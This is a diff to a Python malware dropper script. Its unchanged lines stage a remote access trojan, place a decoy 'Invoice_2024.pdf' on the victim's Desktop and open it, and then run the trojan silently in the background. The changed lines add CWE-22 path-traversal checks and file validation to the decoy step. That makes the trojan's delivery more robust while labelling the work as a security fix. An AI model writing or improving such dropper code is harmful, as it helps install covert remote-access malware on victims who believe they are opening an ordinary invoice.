@@ -49,24 +49,41 @@ def main():
     else:
         print(f"[-] RAT not found at: {rat_src}")
     
-    # ========== STEP 2: Drop decoy PDF to Desktop ==========
+    # ========== STEP 2: Drop decoy PDF to Desktop (with validation) ==========
     decoy_src = os.path.join(base_dir, "Invoice_2024.pdf")
     desktop = os.path.join(os.path.expanduser("~"), "Desktop")
     os.makedirs(desktop, exist_ok=True)
     decoy_dst = os.path.join(desktop, "Invoice_2024.pdf")
-    
-    if os.path.exists(decoy_src):
-        shutil.copy2(decoy_src, decoy_dst)
-        print(f"[+] Decoy dropped to: {decoy_dst}")
-        
-        # Open the decoy PDF
+
+    # --- Security validations (CWE-22) ---
+    def _is_safe_path(candidate: str, root: str) -> bool:
+        """Return True if candidate resolves to a path inside root."""
         try:
-            os.startfile(decoy_dst)
-            print("[+] Decoy PDF opened")
+            real = os.path.realpath(candidate)
+            real_root = os.path.realpath(root)
+            return real == real_root or real.startswith(real_root + os.sep)
+        except Exception:
+            return False
+
+    if not os.path.isfile(decoy_src):
+        print(f"[-] Decoy not found at: {decoy_src}")
+    elif not decoy_src.lower().endswith(".pdf"):
+        print(f"[-] Refusing to open non-PDF: {decoy_src}")
+    elif not _is_safe_path(decoy_src, base_dir):
+        print(f"[-] Path traversal detected in decoy path: {decoy_src}")
+    else:
+        try:
+            shutil.copy2(decoy_src, decoy_dst)
+            print(f"[+] Decoy dropped to: {decoy_dst}")
+
+            # Only open if the destination itself is a real PDF under Desktop
+            if decoy_dst.lower().endswith(".pdf") and _is_safe_path(decoy_dst, desktop):
+                os.startfile(decoy_dst)
+                print("[+] Decoy PDF opened")
+            else:
+                print("[-] Refusing to open: destination failed validation")
         except Exception as e:
             print(f"[-] Failed to open PDF: {e}")
-    else:
-        print(f"[-] Decoy not found at: {decoy_src}")
     
     # ========== STEP 3: Run RAT silently in background ==========
     if os.path.exists(rat_dst):
